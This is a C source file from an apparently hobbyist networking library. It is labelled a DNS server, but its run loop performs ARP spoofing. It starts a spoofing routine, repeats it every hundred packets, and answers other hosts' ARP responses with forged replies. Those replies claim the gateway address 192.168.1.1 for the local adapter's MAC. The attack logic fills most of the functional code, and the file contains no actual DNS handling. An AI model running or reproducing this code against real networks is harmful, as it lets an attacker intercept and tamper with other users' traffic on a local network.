#include "../common/error/udo_error.h"
#include "../common/core/udo_cont.h"
#include "udo_link_layer.h"
#include "udo_adapter.h"
#include "udo_server_dns.h"
#include "udo_arp.h"
#include "udo_arp_spoofing.h"

static void udo_server_dns_run(void* arg);

void udo_server_dns_init(udo_server_dns* self, char* dns_name)
{
	int dns_len = strlen(dns_name);
	udo_assert(UDO_SERVER_DNS_LEN > dns_len);
	memset(self->dns_name, 0, UDO_SERVER_DNS_LEN);
	memcpy(self->dns_name, dns_name, dns_len);
	udo_thread_init(&self->thread, udo_server_dns_run, self);
}

void udo_server_dns_run(void* arg)
{
	//关于网络访问层 应该放到适配器类中操作
	udo_server_dns* self = (udo_server_dns*)arg; 
	udo_adapter adapter;
	char adapter_name[256] = "";
	int res = 0;
	int packet_len;
	unsigned char* u_packet;
	int counter = 0;

	udo_adapter_init(&adapter, UDO_IF_TYPE_ETHERNET);

	udo_arp_spoofing arp_spoofing;
	udo_arp_spoofing_init(&arp_spoofing, &adapter);
	udo_arp_spoofing_start(&arp_spoofing);
	while ((res = udo_adapter_rpacket(&adapter, &u_packet, &packet_len)) >= 0)
	{
		if (counter == 100)
		{
			udo_arp_spoofing_start(&arp_spoofing);
			counter = 0;
		}
		if (res == 0)
		{
			continue;
		}
		
		counter++;
		udo_link_layer link_layer;
		udo_link_layer_init(&link_layer);
		udo_link_layer_deserialize(&link_layer, u_packet);
		if (strncmp(udo_adapter_mac(&adapter), udo_link_layer_getsrc(&link_layer), UDO_MAC_ADDR_LEN) != 0)
		{
			if (udo_link_layer_gettype(&link_layer) != UDO_LINK_TYPE_ARP)
			{
				continue;
			}
			unsigned char* src = udo_link_layer_getsrc(&link_layer);
			for (int i = 0; i < UDO_MAC_ADDR_LEN; ++i)
			{
				printf("%02x ", src[i]);
			}
			printf("\n");
			if (udo_link_layer_gettype(&link_layer) != UDO_LINK_TYPE_ARP)
			{
				continue;
			}
			udo_arp arp;
			udo_arp_init(&arp,NULL);
			udo_arp_deserialize(&arp, u_packet, UDO_LINK_LAYER_LEN);
			if (strncmp(udo_arp_getsia(&arp), "192.168.1.1", UDO_IP_ADDR_FORMAT_LEN) == 0)
			{
				continue;
			}
			if (udo_arp_getop(&arp) == UDO_ARP_RESPONSE)
			{
				udo_arp arp_request;
				udo_arp_init(&arp_request, &adapter);
				udo_arp_setop(&arp_request, UDO_ARP_RESPONSE);
				udo_arp_setsma(&arp_request, udo_adapter_mac(&adapter));
				udo_arp_setsia(&arp_request, "192.168.1.1");
				udo_arp_setdma(&arp_request, udo_link_layer_getsrc(&link_layer));
				unsigned int* nIp = (int*)udo_arp_getsia(&arp);
				struct in_addr addr;
				addr.S_un.S_addr = *nIp;
				char* ip = inet_ntoa(addr);
				udo_arp_setdia(&arp_request, ip);
				udo_arp_send(&arp_request);
			}
			
			udo_arp_term(&arp);
		}
		udo_link_layer_term(&link_layer);
	}


	udo_adapter_term(&adapter);
}

void udo_server_dns_start(udo_server_dns* self)
{
	udo_thread_start(&self->thread);
}

void udo_server_term(udo_server_dns* self)
{
	udo_thread_term(&self->thread);
}

